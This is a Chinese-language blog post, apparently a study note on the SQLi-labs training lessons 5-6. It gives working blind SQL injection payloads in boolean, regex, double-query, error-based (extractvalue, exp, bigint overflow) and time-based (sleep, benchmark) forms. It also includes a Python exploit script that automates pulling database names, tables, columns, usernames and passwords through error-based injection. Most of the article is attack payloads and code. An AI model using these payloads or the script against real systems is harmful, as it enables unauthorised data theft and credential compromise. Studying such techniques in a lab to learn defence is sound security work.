@@ -1,0 +1,294 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SQL:sqlilabs less-5-6:盲注 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="推荐使用报错注入
+布尔(Boolean)注入：判断数据库长度：?id=1&#39; and length(database())&amp;gt;0--+
+?id=1’ and length(database())=,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">SQL:sqlilabs less-5-6:盲注</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">SQL:sqlilabs less-5-6:盲注</h1>
+        <div class="stuff">
+            <span>十二月 05, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>推荐使用报错注入</p>
+<h2 id="布尔-Boolean-注入："><a href="#布尔-Boolean-注入：" class="headerlink" title="布尔(Boolean)注入："></a>布尔(Boolean)注入：</h2><h4 id="判断数据库长度："><a href="#判断数据库长度：" class="headerlink" title="判断数据库长度："></a>判断数据库长度：</h4><pre><code>?id=1' and length(database())&gt;0--+</code></pre>
+<p>?id=1’ and length(database())=8–+ 得到“you’re in…”的结果，分析数据库有八位；</p>
+<h4 id="确定数据库名称组成："><a href="#确定数据库名称组成：" class="headerlink" title="确定数据库名称组成："></a>确定数据库名称组成：</h4><pre><code>?id=1' and ascii(substr(database(),1,1)=83)--+</code></pre>
+<p>这里的s的ASCII码为83，以此类推，一一比较；</p>
+<h4 id="判断表的个数："><a href="#判断表的个数：" class="headerlink" title="判断表的个数："></a>判断表的个数：</h4><pre><code>?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;0--+</code></pre>
+<h4 id="判断表的长度："><a href="#判断表的长度：" class="headerlink" title="判断表的长度："></a>判断表的长度：</h4><pre><code>?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;0--+</code></pre>
+<h4 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h4><pre><code>?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;79--+</code></pre>
+<h4 id="确定列数："><a href="#确定列数：" class="headerlink" title="确定列数："></a>确定列数：</h4><pre><code>and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')&gt;0--+</code></pre>
+<h4 id="确定列长度："><a href="#确定列长度：" class="headerlink" title="确定列长度："></a>确定列长度：</h4><pre><code>and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1)) &gt; 0--+</code></pre>
+<h4 id="爆列名："><a href="#爆列名：" class="headerlink" title="爆列名："></a>爆列名：</h4><pre><code>and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1),1,1)) &gt; 79</code></pre>
+<h4 id="爆数据："><a href="#爆数据：" class="headerlink" title="爆数据："></a>爆数据：</h4><pre><code>and ascii(substr((select username from users limit 0,1),1,1))&gt;67</code></pre>
+<pre><code>and ascii(substr((select password from users limit 0,1),1,1))&gt;67</code></pre>
+<p>以此类推，得出剩余数据。</p>
+<h2 id="正则注入："><a href="#正则注入：" class="headerlink" title="正则注入："></a>正则注入：</h2><p>前同布尔注入；</p>
+<h4 id="关于正则注入的解释："><a href="#关于正则注入的解释：" class="headerlink" title="关于正则注入的解释："></a>关于正则注入的解释：</h4><p>（\1. 判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名。</p>
+<p>注：正则表达式中 ^[a-z] 表示字符串中开始字符是在 a-z范围内</p>
+<pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1) /*</code></pre>
+<p>\2. 判断第一个字符是否是a-n中的字符</p>
+<pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)/*</code></pre>
+<p>\3. 确定该字符为n</p>
+<pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 0,1) /*</code></pre>
+<p>\4. 表达式的更换如下</p>
+<p>expression like this: ‘^n[a-z]’ -&gt; ‘^ne[a-z]’ -&gt; ‘^new[a-z]’ -&gt; ‘^news[a-z]’ -&gt; FALSE</p>
+<p>这时说明表名为news ，要验证是否是该表明 正则表达式为’^news’，但是没这必要 直接判断 table_name = ’news‘ 不就行了。</p>
+<p>\5.regexp匹配的时候会在所有的项都进行匹配。例如:</p>
+<pre><code>security数据库的表有多个，users，email等
+
+select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^u[a-z]' limit 0,1);是正确的
+
+select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);是正确的
+
+select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^em[a-z]' limit 0,1);是正确的
+
+select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 1,1);不正确
+
+select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^em[a-z]' limit 1,1);不正确</code></pre>
+<p>实验表明：在limit 0,1下，regexp会匹配所有的项。我们在使用regexp时，要注意有可能有多个项，同时要一个个字符去爆破。类似于上述第一条和第二条。而此时limit 0,1此时是对于where table_schema=’security’ limit 0,1。table_schema=’security’已经起到了限定作用了，limit有没有已经不重要了。）</p>
+<h4 id="爆表名：-1"><a href="#爆表名：-1" class="headerlink" title="爆表名："></a>爆表名：</h4><pre><code>id=1' and 1=(select 1 from information_schema.columns
+where table_name='users' and column_name regexp '^us[a-z]' limit 0,1) --+</code></pre>
+<h4 id="判断表中的第一列是否含有username："><a href="#判断表中的第一列是否含有username：" class="headerlink" title="判断表中的第一列是否含有username："></a>判断表中的第一列是否含有username：</h4><pre><code>id=1' and 1=(select 1 from information_schema.columns
+where table_name='users' and column_name regexp '^username' limit 0,1) --+</code></pre>
+<h4 id="猜测users表的内容："><a href="#猜测users表的内容：" class="headerlink" title="猜测users表的内容："></a>猜测users表的内容：</h4><pre><code>id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)
+FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--</code></pre>
+<h2 id="二次查询注入："><a href="#二次查询注入：" class="headerlink" title="二次查询注入："></a>二次查询注入：</h2><p>二次查询注入是两个select语句的嵌套，嵌套的语句称为子查询语句</p>
+<h4 id="爆数据库名："><a href="#爆数据库名：" class="headerlink" title="爆数据库名："></a>爆数据库名：</h4><pre><code>?id=1' union SELECT null,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre>
+<p>第二次查询数据库是报错“duplicate entry ‘security1’ for key ‘group_key’</p>
+<p>这里的“security”就是我们想获得的数据库名称</p>
+<h4 id="爆表名：-2"><a href="#爆表名：-2" class="headerlink" title="爆表名："></a>爆表名：</h4><pre><code>?id=1' union SELECT null,count(*),concat((select table_name from information_schema.tables where table_schema='security'limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre>
+<p>这里的limit x,1是为了让数据更好的爆出，以此类推第四张表为：</p>
+<pre><code>?id=1' union SELECT null,count(*),concat((select table_name from information_schema.tables where table_schema='security'limit 3,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre>
+<p>得到“users”的表名称；</p>
+<h4 id="爆列名：-1"><a href="#爆列名：-1" class="headerlink" title="爆列名："></a>爆列名：</h4><p>列一：</p>
+<pre><code>?id=1' union SELECT null,count(*),concat((select column_name from information_schema.columns where table_name='users'limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre>
+<p>列二：</p>
+<pre><code>?id=1' union SELECT null,count(*),concat((select column_name from information_schema.columns where table_name='users'limit 1,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre>
+<p>得到“username”和“password”两个列名；</p>
+<h4 id="爆字段："><a href="#爆字段：" class="headerlink" title="爆字段："></a>爆字段：</h4><pre><code>?id=1' union SELECT null,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre>
+<pre><code>?id=1' union SELECT null,count(*),concat((select password from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre>
+<h5 id="一个exp脚本："><a href="#一个exp脚本：" class="headerlink" title="一个exp脚本："></a>一个exp脚本：</h5><pre><code>import requests
+from bs4 import BeautifulSoup
+db_name = ''
+table_list = []
+column_list = []
+url = '''http://192.168.1.113:86/Less-5/?id=1'''
+### 获取当前数据库名 ###
+print('当前数据库名:')
+payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''
+r = requests.get(url+payload)
+db_name = r.text.split(':')[-2]
+print('[+]' + db_name)
+### 获取表名 ###
+print('数据库%s下的表名:' % db_name)
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)
+    r = requests.get(url+payload)
+    if 'group_key' not in r.text:
+        break
+    table_name = r.text.split(':')[-2]
+    table_list.append(table_name)
+    print('[+]' + table_name)
+### 获取列名 ###
+#### 这里以users表为例 ####
+print('%s表下的列名:' % table_list[-1])
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)
+    r = requests.get(url + payload)
+    if 'group_key' not in r.text:
+        break
+    column_name = r.text.split(':')[-2]
+    column_list.append(column_name)
+    print('[+]' + column_name)
+### 获取字段值 ###
+#### 这里以username列为例 ####
+print('%s列下的字段值:' % column_list[-2])
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)
+    r = requests.get(url + payload)
+    if 'group_key' not in r.text:
+        break
+    dump = r.text.split(':')[-2]
+    print('[+]' + dump)</code></pre>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="利用xpath函数报错注入"><a href="#利用xpath函数报错注入" class="headerlink" title="利用xpath函数报错注入:"></a>利用xpath函数报错注入:</h3><h4 id="爆数据库名：-1"><a href="#爆数据库名：-1" class="headerlink" title="爆数据库名："></a>爆数据库名：</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,database(),0x23))%23</code></pre>
+<p>注：这里的0x23可以更改为非“/”的符号，第二个“0x23”也可以省略；</p>
+<p>得到报错：</p>
+<pre><code>XPATH syntax error:'#security#'</code></pre>
+<p>则”security“为我们想要查询的数据库名。</p>
+<h4 id="爆表名：-3"><a href="#爆表名：-3" class="headerlink" title="爆表名："></a>爆表名：</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x23))--+</code></pre>
+<h4 id="爆列名：-2"><a href="#爆列名：-2" class="headerlink" title="爆列名："></a>爆列名：</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),0x23))--+</code></pre>
+<h4 id="爆字段：-1"><a href="#爆字段：-1" class="headerlink" title="爆字段："></a>爆字段：</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,(select username from users limit 1,1),0x23))--+</code></pre>
+<pre><code>?id=1' and extractvalue(1,concat(0x23,(select password from users limit 1,1),0x23))--+</code></pre>
+<p>这边是看到有个说法说“爆密码时密码不全，要用截取函数截取剩下的密码”</p>
+<pre><code>and extractvalue(1,concat(0x23,substr(（select password from users limit 0,1）,32,1),0x23))</code></pre>
+<p>暂时没有遇到“爆密码时密码不全”的情况，理解了以后再来补充</p>
+<p>以此类推，得出剩余数据。</p>
+<h3 id="利用double数值类型超出范围进行报错注入："><a href="#利用double数值类型超出范围进行报错注入：" class="headerlink" title="利用double数值类型超出范围进行报错注入："></a>利用double数值类型超出范围进行报错注入：</h3><pre><code>?id=1' union select (exp(~(select * from (select user())a))),2,3--+</code></pre>
+<p>得到报错：</p>
+<pre><code>DOUBLE value is out of range in'exp(~((select 'root@localhost'from dual)))'</code></pre>
+<h3 id="利用bigint溢出进行报错注入"><a href="#利用bigint溢出进行报错注入" class="headerlink" title="利用bigint溢出进行报错注入:"></a>利用bigint溢出进行报错注入:</h3><pre><code>?id=1' union select (!(select * from (select user())x) - ~0),2,3--+</code></pre>
+<p>得到报错：</p>
+<pre><code>BRIGHT UNSIGNLD value is out of range in '((not((select 'root@localhost'from dual)))-~(0))'</code></pre>
+<h3 id="利用数据的重复性"><a href="#利用数据的重复性" class="headerlink" title="利用数据的重复性:"></a>利用数据的重复性:</h3><pre><code>?id=1' union select 1,2,3 from (select name_const(version(),1),name_const(version(),1))x --+</code></pre>
+<p>得到报错：</p>
+<pre><code>duplicate column name~~~~</code></pre>
+<h2 id="延时注入："><a href="#延时注入：" class="headerlink" title="延时注入："></a>延时注入：</h2><h4 id="sleep-函数延时注入："><a href="#sleep-函数延时注入：" class="headerlink" title="sleep()函数延时注入："></a>sleep()函数延时注入：</h4><pre><code>?id=1'and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></pre>
+<p>当错误的时候会有5秒的时间延时。</p>
+<h4 id="benchmark函数延时注入："><a href="#benchmark函数延时注入：" class="headerlink" title="benchmark函数延时注入："></a>benchmark函数延时注入：</h4><pre><code>?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+</code></pre>
+<p>当结果正确的时候，运行ENCODE(‘MSG’,’by 5 seconds’)操作50000000次，会占用一段时间。</p>
+<h2 id="可以使用group-concat-一次查询所有表名"><a href="#可以使用group-concat-一次查询所有表名" class="headerlink" title="可以使用group_concat 一次查询所有表名"></a>可以使用group_concat 一次查询所有表名</h2>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94-Boolean-%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">布尔(Boolean)注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6%EF%BC%9A"><span class="toc-number">1.0.1.</span> <span class="toc-text">判断数据库长度：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E7%BB%84%E6%88%90%EF%BC%9A"><span class="toc-number">1.0.2.</span> <span class="toc-text">确定数据库名称组成：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E8%A1%A8%E7%9A%84%E4%B8%AA%E6%95%B0%EF%BC%9A"><span class="toc-number">1.0.3.</span> <span class="toc-text">判断表的个数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E8%A1%A8%E7%9A%84%E9%95%BF%E5%BA%A6%EF%BC%9A"><span class="toc-number">1.0.4.</span> <span class="toc-text">判断表的长度：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D%EF%BC%9A"><span class="toc-number">1.0.5.</span> <span class="toc-text">爆表名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%88%97%E6%95%B0%EF%BC%9A"><span class="toc-number">1.0.6.</span> <span class="toc-text">确定列数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%88%97%E9%95%BF%E5%BA%A6%EF%BC%9A"><span class="toc-number">1.0.7.</span> <span class="toc-text">确定列长度：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%88%97%E5%90%8D%EF%BC%9A"><span class="toc-number">1.0.8.</span> <span class="toc-text">爆列名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%EF%BC%9A"><span class="toc-number">1.0.9.</span> <span class="toc-text">爆数据：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">正则注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5%E7%9A%84%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-number">2.0.1.</span> <span class="toc-text">关于正则注入的解释：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D%EF%BC%9A-1"><span class="toc-number">2.0.2.</span> <span class="toc-text">爆表名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E8%A1%A8%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E5%88%97%E6%98%AF%E5%90%A6%E5%90%AB%E6%9C%89username%EF%BC%9A"><span class="toc-number">2.0.3.</span> <span class="toc-text">判断表中的第一列是否含有username：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%9C%E6%B5%8Busers%E8%A1%A8%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">2.0.4.</span> <span class="toc-text">猜测users表的内容：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">二次查询注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%9A"><span class="toc-number">3.0.1.</span> <span class="toc-text">爆数据库名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D%EF%BC%9A-2"><span class="toc-number">3.0.2.</span> <span class="toc-text">爆表名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%88%97%E5%90%8D%EF%BC%9A-1"><span class="toc-number">3.0.3.</span> <span class="toc-text">爆列名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5%EF%BC%9A"><span class="toc-number">3.0.4.</span> <span class="toc-text">爆字段：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E4%B8%AAexp%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="toc-number">3.0.4.1.</span> <span class="toc-text">一个exp脚本：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8xpath%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text">利用xpath函数报错注入:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%9A-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">爆数据库名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D%EF%BC%9A-3"><span class="toc-number">4.1.2.</span> <span class="toc-text">爆表名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%88%97%E5%90%8D%EF%BC%9A-2"><span class="toc-number">4.1.3.</span> <span class="toc-text">爆列名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5%EF%BC%9A-1"><span class="toc-number">4.1.4.</span> <span class="toc-text">爆字段：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8double%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E8%B6%85%E5%87%BA%E8%8C%83%E5%9B%B4%E8%BF%9B%E8%A1%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">4.2.</span> <span class="toc-text">利用double数值类型超出范围进行报错注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8bigint%E6%BA%A2%E5%87%BA%E8%BF%9B%E8%A1%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">利用bigint溢出进行报错注入:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%B0%E6%8D%AE%E7%9A%84%E9%87%8D%E5%A4%8D%E6%80%A7"><span class="toc-number">4.4.</span> <span class="toc-text">利用数据的重复性:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">延时注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep-%E5%87%BD%E6%95%B0%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">5.0.1.</span> <span class="toc-text">sleep()函数延时注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#benchmark%E5%87%BD%E6%95%B0%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">5.0.2.</span> <span class="toc-text">benchmark函数延时注入：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8group-concat-%E4%B8%80%E6%AC%A1%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="toc-number">6.</span> <span class="toc-text">可以使用group_concat 一次查询所有表名</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
